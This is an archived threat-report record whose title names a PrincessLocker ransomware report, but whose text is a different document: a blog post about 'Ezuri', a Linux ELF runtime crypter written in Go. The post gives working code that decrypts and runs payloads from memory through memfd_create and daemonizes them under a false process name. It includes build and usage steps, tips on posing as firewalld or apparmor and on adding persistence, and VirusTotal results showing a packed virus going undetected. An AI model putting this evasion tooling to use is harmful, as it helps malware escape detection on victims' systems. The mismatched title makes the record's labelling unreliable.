{
    "id": "ade65363-da81-40c0-b388-78bc13141eff",
    "created_at": "2023-01-12T15:09:57.662314Z",
    "updated_at": "2025-03-27T02:05:43.410686Z",
    "deleted_at": null,
    "sha1_hash": "d252cb71568d6fc6551d5600187f8709a7cb04da",
    "title": "2016-11-21 - PrincessLocker – ransomware with not so royal encryption",
    "authors": "",
    "file_creation_date": "2022-05-01T14:12:36Z",
    "file_modification_date": "2022-05-01T14:12:36Z",
    "file_size": 134392,
    "plain_text": "# Linux ELF Runtime Crypter\n\n**guitmz.com/linux-elf-runtime-crypter**\n\nGuilherme Thomazi April 26, 2019\n\n\"Even for Elves, they were stealthy little twerps. They'd taken our measure before we'd even\nseen them.\" — Marshall Volnikov\n\n[Last month I wrote a post about the](https://www.guitmz.com/running-elf-from-memory/) `memfd_create syscall and left some ideas in the end.`\nToday I’m here to show an example of such ideas implemented in an ELF runtime crypter\n(kinda lame, I know, but good for this demonstration).\n\n## What is it?\n\nGlad you asked. `Ezuri is a small` `Go crypter that uses` `AES to encrypt a given file and`\nmerges it with a stub that will decrypt and execute the file from memory (using the\npreviously mentioned `memfd_create syscall). My original goal was to write it in`\n```\nAssembly but that would require more time so it is a task for the future.\n\n```\nIt will also do some basic tricks during the process execution, making it a little bit harder to\nbe detected by an inexperienced eye. The main trick consists on daemonizing the process,\ndetaching it from a `tty, having it to run in the background (and as I said, from memory). If`\n[you are not familiar with daemons, you can find more information here.](https://en.wikipedia.org/wiki/Daemon_(computing))\n\nAs usual, the full source code with more instructions can be found in my GitHub:\n[https://github.com/guitmz/ezuri](https://github.com/guitmz/ezuri)\n\nIt’s also worth mentioning that it ONLY works on 64 bits Linux systems, but you can easily\nadapt the code if necessary, I’m just lazy.\n\n## Where the magic happens\n\nRemember this function from my last post?\n```\nfunc runFromMemory(displayName string, filePath string) {\n     fdName := \"\" // *string cannot be initialized\n     fd, _, _ := syscall.Syscall(memfdCreate, uintptr(unsafe.Pointer(&fdName)),\nuintptr(mfdCloexec), 0)\n     buffer, _ := ioutil.ReadFile(filePath)\n     _, _ = syscall.Write(int(fd), buffer)\n     fdPath := fmt.Sprintf(\"/proc/self/fd/%d\", fd)\n     _ = syscall.Exec(fdPath, []string{displayName}, nil)\n}\n\n```\n\n-----\n\nThat s right, with some small adjustments, we can achieve our goal of running the target\nexecutable as a daemon:\n```\nfunc runFromMemory(procName string, buffer []byte) {\n     fdName := \"\" // *string cannot be initialized\n     fd, _, _ := syscall.Syscall(memfdCreateX64, uintptr(unsafe.Pointer(&fdName)),\nuintptr(mfdCloexec), 0)\n     _, _ = syscall.Write(int(fd), buffer)\n     fdPath := fmt.Sprintf(\"/proc/self/fd/%d\", fd)\n     switch child, _, _ := syscall.Syscall(fork, 0, 0, 0); child {\n     case 0:\n          break\n     case 1:\n          // Fork failed!\n          break\n     default:\n          // Parent exiting...\n          os.Exit(0)\n     }\n     _ = syscall.Umask(0)\n     _, _ = syscall.Setsid()\n     _ = syscall.Chdir(\"/\")\n     file, _ := os.OpenFile(\"/dev/null\", os.O_RDWR, 0)\n     syscall.Dup2(int(file.Fd()), int(os.Stdin.Fd()))\n     file.Close()\n     _ = syscall.Exec(fdPath, []string{procName}, nil)\n}\n\n```\nNo proper error handling at this time (told you I was lazy).\n\nYou will need `Go and` `GCC installed and configured in your machine to proceed with the`\nnext section if you want to try `Ezuri yourself.`\n\n## See it in action\n\nLet’s see this thing working then. A small `C program will be used as a target executable`\nhere. The program will write a little demon into a file named `log.txt in the current`\ndirectory every second for as long as it’s running, because we are dealing with daemons! Got\nit? Demon, daemon…\n\nBad jokes aside, here’s the code:\n\n\n-----\n\n```\n#include <stdio.h>\nint main(int argc, char ** argv) {\n FILE * fp = fopen(\"/tmp/log.txt\", \"w+\");\n while (1) {\n  sleep(1);\n  fprintf(fp, \"I always wanted to be a DAEMON!\\n\");\n  fprintf(fp, \" |\\\\___/|\\n\");\n  fprintf(fp, \" /    \\\\\\n\");\n  fprintf(fp, \"|  /\\\\__/|\\n\");\n  fprintf(fp, \"||\\\\ <.><.>\\n\");\n  fprintf(fp, \"| _   > )\\n\");\n  fprintf(fp, \" \\\\  /----\\n\");\n  fprintf(fp, \" |  -\\\\/\\n\");\n  fprintf(fp, \" /   \\\\\\n\\n\");\n  fprintf(fp, \"Wait, something is not right...\\n\");\n  fflush(fp);\n }\n fclose(fp);\n return 0;\n}\n\n```\nBuilding `demon.c :`\n\n$ gcc demon.c -o demon\n\nWe should also build `Ezuri, running the following from inside of the folder that contains`\nits source code:\n\n$ go build -o ezuri .\n\nThe `stub will be compiled during the crypter execution. After you enter your desired`\nparameters like below:\n```\n$ ./ezuri\n[?] Path of file to be encrypted: demon\n[?] Path of output (encrypted) file: cryptedDemon\n[?] Name of the target process: DEMON\n[?] Encryption key (32 bits - random if empty):\n[?] Encryption IV (16 bits - random if empty):\n[!] Random encryption key (used in stub): R@7ya3fo1#y67rCtNOYwpm5lyOA5xeYY\n[!] Random encryption IV (used in stub): 5Ti65dgBKidm5%sA\n[!] Generating stub...\n\n```\nI chose to let `Ezuri generate a encryption key for me but feel free to enter your own if you`\nwish.\n\nNow you should have a file named `cryptedDemon in your current directory. This file`\ncontains the `stub + demon (encrypted) executables (in this order, actually).`\n\nExecute `cryptedDemon and inspect its process:`\n\n\n-----\n\n```\n$ ./cryptedDemon\n$ ps -f $(pidof DEMON)\nUID    PID PPID C STIME TTY   STAT  TIME CMD\nguitmz  18607   1 0 18:11 ?    Ss   0:00 DEMON\n\n```\nNote that this time, you have `? for the` `tty, which means that the process is detached`\nfrom any terminals and running in the background.\n\nIf you check `/tmp/log.txt file, you should see a bunch of little demons being inserted into`\nthe file like this:\n```\n$ tailf /tmp/log.txt\nI always wanted to be a DAEMON!\n |\\___/|\n /    \\\n|  /\\__/|\n||\\ <.><.>\n| _   > )\n \\  /--- |  -\\/\n /   \\\nWait, something is not right...\n\n```\nFinally, don’t forget to kill your test process:\n\n$ kill $(pidof DEMON)\n\n## Final thoughts\n\nIf you give your process a proper name (something related to an actual Linux process, like\n```\nfirewalld, apparmor or even xorg ), it can be difficult to spot your executable.\n\n```\nAdditionally, further work on this project can make it even more realiable (for example,\nmaking reverse engineering of your commercial software more difficult). A few thoughts:\n\nDeamon responding to process signals (such as SIGHUP, SIGKILL, etc) to restart its\nprocess if killed, for example. I may write a post about it in the future as I have already\nwrote some code that takes advantage of this.\nPlay around with the encryption method, the keys (like using multiple keys, removing\nthe key from the stub somehow) and so on.\nSomething like autostarting with every user login could also be implemented.\n\nThose are all basic ideas. `memfd_create has a lot of potential and can be combined with`\nmultiple techniques other than a simple crypter/dropper.\n\n**_[Update: I have packed my latest ELF prepender Linux.Cephei with](https://www.guitmz.com/linux-cephei-a-nim-virus/)_** `Ezuri and uploaded to`\nVirusTotal. Results are below:\n\n\n-----\n\n_Unpacked Linux.Cephei:_\nhttps://www.virustotal.com/gui/file/35308b8b770d2d4f78299262f595a0769e55152cb432d\n0efc42292db01609a18/detection\n\n_Packed Linux.Cephei:_\nhttps://www.virustotal.com/gui/file/ddbb714157f2ef91c1ec350cdf1d1f545290967f61491404c\n81b4e6e52f5c41f/detection\n\nSo as of today (May 2nd 2019), the `Ezuri stub is undetected.`\n\nTMZ\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Linux/Evasion/Linux ELF Runtime Crypter.pdf"
    ],
    "report_names": [
        "Linux ELF Runtime Crypter.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536197,
    "ts_updated_at": 1743041143,
    "ts_creation_date": 1651414356,
    "ts_modification_date": 1651414356,
    "files": {
        "pdf": "https://archive.orkl.eu/d252cb71568d6fc6551d5600187f8709a7cb04da.pdf",
        "text": "https://archive.orkl.eu/d252cb71568d6fc6551d5600187f8709a7cb04da.txt",
        "img": "https://archive.orkl.eu/d252cb71568d6fc6551d5600187f8709a7cb04da.jpg"
    }
}